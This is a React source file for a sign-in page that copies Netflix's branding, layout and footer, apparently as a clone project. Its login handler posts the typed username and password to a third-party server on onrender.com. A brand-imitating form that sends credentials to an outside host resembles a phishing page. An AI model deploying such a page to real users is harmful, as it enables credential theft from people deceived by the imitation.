import React, { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import axios from "axios"
import netflix from './assets/NetflixBg.jpg'

function App() {

  const navigate = useNavigate()

  const [user, setUser] = useState("")
  const [pass, setPass] = useState("")
  const [error, setError] = useState("")

  function handleUser(evt) {
    setUser(evt.target.value)
    setError("")
  }

  function handlePass(evt) {
    setPass(evt.target.value)
    setError("")
  }

  function check() {
    if (user.trim() === "" || pass.trim() === "") {
      setError("Please fill all fields")
      return
    }

    axios.post("https://netflix-backend-og72.onrender.com/login", {
      username: user,
      password: pass
    })
      .then(res => {
        if (res.data === true) {
          navigate("/landing")
        } else {
          setError("Enter correct Email or Password")
        }
      })
      .catch(() => {
        setError("Server error. Try again later")
      })
  }

  return (
    <div className="min-h-screen w-full bg-black">

      
      <div className="relative w-full h-screen">

        
        <img
          src={netflix}
          alt="Background"
          className="absolute inset-0 w-full h-full object-cover hidden md:flex"
        />

        
        <div className="absolute inset-0 bg-black/60 w-full h-full z-10"></div>

        
        <h1 className="text-4xl md:text-5xl text-[#e91a21] font-extrabold absolute top-4 left-4 md:top-6 md:left-20 z-30">
          NETFLIX
        </h1>

        
        <div className="absolute inset-0 z-20 flex justify-center items-center px-4">
          <div className="bg-black/80 p-6 md:p-12 rounded w-full max-w-md">

            <h1 className="text-white text-3xl md:text-4xl font-bold mb-6">Sign In</h1>

            <div className="flex flex-col gap-5">

              <input
                onChange={handleUser}
                placeholder="Email or mobile number"
                className="border border-gray-600 px-3 py-3 rounded bg-black/40 text-white"
              />

              <input
                onChange={handlePass}
                placeholder="Password"
                type="password"
                className="border border-gray-600 px-3 py-3 rounded bg-black/40 text-white"
              />

              {error && <p className="text-red-500 text-sm">{error}</p>}

              <button
                onClick={check}
                className="bg-[#e50914] hover:bg-[#b20710] duration-200 text-white py-3 text-lg rounded"
              >
                Sign In
              </button>

              <p className="text-gray-400 text-center">OR</p>

              <button className="bg-[#4c4c4c] hover:bg-[#3b3b3b] text-white py-3 text-lg rounded">
                Use a sign-in code
              </button>

              <a className="text-white text-center underline" href="#">
                Forgot password?
              </a>

              <label className="flex items-center gap-2">
                <input type="checkbox" className="h-4 w-4 accent-white" />
                <span className="text-white">Remember me</span>
              </label>

              <p className="text-gray-400">
                New to Netflix?
                <a href="#" className="text-white font-bold"> Sign up now.</a>
              </p>

              <p className="text-gray-400 text-xs font-semibold">
                This page is protected by Google reCAPTCHA to ensure you're not a bot.
              </p>

              <a href="#" className="text-blue-400 underline text-sm">
                Learn more.
              </a>

            </div>

          </div>
        </div>
      </div>

      {/* FOOTER */}
      <footer className="bg-[#141414] text-gray-300 w-full px-6 py-10 md:px-20 space-y-6">

        <p>Questions? Call 000-800-919-1743 (Toll-Free)</p>

        <div className="grid grid-cols-2 md:grid-cols-4 gap-3 underline">
          <a>FAQ</a>
          <a>Help Center</a>
          <a>Terms of Use</a>
          <a>Privacy</a>
          <a>Cookie Preferences</a>
          <a>Corporate Information</a>
        </div>

        <select className="bg-[#141414] border border-gray-400 px-2 py-1">
          <option>English</option>
        </select>

      </footer>
    </div>
  )
}

export default App
